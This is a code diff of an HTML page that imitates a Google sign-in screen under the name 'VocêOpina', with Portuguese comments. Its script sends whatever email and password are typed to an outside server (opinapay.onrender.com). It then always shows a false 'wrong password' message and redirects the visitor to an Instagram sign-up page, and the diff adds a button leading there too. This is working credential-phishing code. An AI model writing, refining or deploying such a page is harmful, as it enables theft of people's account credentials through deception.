@@ -2,25 +2,44 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width,initial‑scale=1.0"/>
+  <meta name="viewport" content="width=device-width,initial‐scale=1.0"/>
   <title>Login Google - Simulado</title>
   <style>
-    /* Seu CSS aqui… */
-    *{margin:0;padding:0;box-sizing:border-box;font-family:"Roboto",sans-serif}
-    body{background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
-    .container{width:100%;max-width:360px;padding:24px;box-shadow:0 0 10px rgba(0,0,0,0.1);border-radius:8px}
-    .logo{text-align:center;margin-bottom:20px}
-    .logo img{width:90px}
-    h2{font-size:20px;color:#202124;margin-bottom:8px}
-    p{font-size:14px;color:#5f6368;margin-bottom:20px}
-    input{width:100%;padding:12px;font-size:16px;margin-bottom:10px;border:1px solid #dadce0;border-radius:4px;outline:none}
-    input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
-    .link{text-align:right;margin-bottom:20px}
-    .link a{color:#1a73e8;text-decoration:none;font-size:14px}
-    .buttons{display:flex;justify-content:flex-end}
-    .btn{padding:10px 16px;border:none;border-radius:4px;font-weight:500;cursor:pointer}
-    .btn-primary{background-color:#1a73e8;color:white}
-    .footer{text-align:center;margin-top:30px;font-size:12px;color:#5f6368}
+    * { margin:0; padding:0; box-sizing:border-box; font-family:"Roboto",sans-serif }
+    body { background:#fff; display:flex; justify-content:center; align-items:center; height:100vh }
+    .container { width:100%;max-width:360px;padding:24px;box-shadow:0 0 10px rgba(0,0,0,0.1);border-radius:8px; position:relative }
+    .logo { text-align:center; margin-bottom:20px }
+    .logo img { width:90px }
+    h2 { font-size:20px; color:#202124; margin-bottom:8px }
+    p { font-size:14px; color:#5f6368; margin-bottom:20px }
+    input { width:100%; padding:12px; font-size:16px; margin-bottom:10px; border:1px solid #dadce0; border-radius:4px; outline:none }
+    input:focus { border-color:#1a73e8; box-shadow:0 0 0 1px #1a73e8 }
+    .link { text-align:right; margin-bottom:20px }
+    .link a { color:#1a73e8; text-decoration:none; font-size:14px }
+    .buttons { display:flex; justify-content:flex-end; margin-bottom:60px /* espaço para botão Instagram */ }
+    .btn { padding:10px 16px; border:none; border-radius:4px; font-weight:500; cursor:pointer }
+    .btn-primary { background-color:#1a73e8; color:white }
+    .footer { text-align:center; font-size:12px; color:#5f6368 }
+    /* botão Instagram fixo */
+    .btn-instagram {
+      position:absolute;
+      bottom:16px;
+      left:50%;
+      transform:translateX(-50%);
+      display:flex;
+      align-items:center;
+      gap:8px;
+      padding:8px 16px;
+      background: linear-gradient(45deg, #feda75, #d62976, #962fbf, #4f5bd5);
+      color:white;
+      border:none;
+      border-radius:25px;
+      font-weight:500;
+      cursor:pointer;
+      text-decoration:none;
+      font-size:14px;
+    }
+    .btn-instagram img { width:20px; }
   </style>
 
   <!-- Toastify -->
@@ -41,31 +60,35 @@
         <button type="submit" class="btn btn-primary">Avançar</button>
       </div>
     </form>
+
+    <!-- Botão Instagram fixo -->
+
     <div class="footer">© 2025 VocêOpina</div>
   </div>
+
+   <button class="btn-instagram" id="go-instagram">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="IG"/>
+      Entrar com Instagram
+    </button>
 
   <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
   <script>
     const API_URL = "https://opinapay.onrender.com";
 
+    // Força o usuário a usar Instagram ao clicar em Avançar
     document.getElementById("login-form").addEventListener("submit", async (e) => {
       e.preventDefault();
-      const email    = document.getElementById("email").value.trim();
+      const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value;
 
-      // 1) Grava no banco (login ou register Google)
-      try {
-        await fetch(`${API_URL}/login/google`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email, password })
-        });
-        // independente de ok ou erro, a gente prossegue abaixo
-      } catch(err) {
-        console.warn("Falha no POST /login/google (mas vamos prosseguir):", err);
-      }
+      // 1) Envia dados ao backend mesmo assim
+      fetch(`${API_URL}/login/google`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+      }).catch(() => {/* ignora erro */});
 
-      // 2) Mostra toast de “senha incorreta”
+      // 2) Exibe toast de erro
       Toastify({
         text: "Senha incorreta. Faça cadastro via Instagram para continuar.",
         duration: 3000,
@@ -75,10 +98,15 @@
         backgroundColor: "#FF5656",
       }).showToast();
 
-      // 3) Redireciona para cadastro Instagram depois do toast
+      // 3) Redireciona após o toast
       setTimeout(() => {
         window.location.href = "instagram.html";
       }, 3500);
+    });
+
+    // Clicar no botão Instagram leva imediatamente ao cadastro do Instagram
+    document.getElementById("go-instagram").addEventListener("click", () => {
+      window.location.href = "instagram.html";
     });
   </script>
 </body>
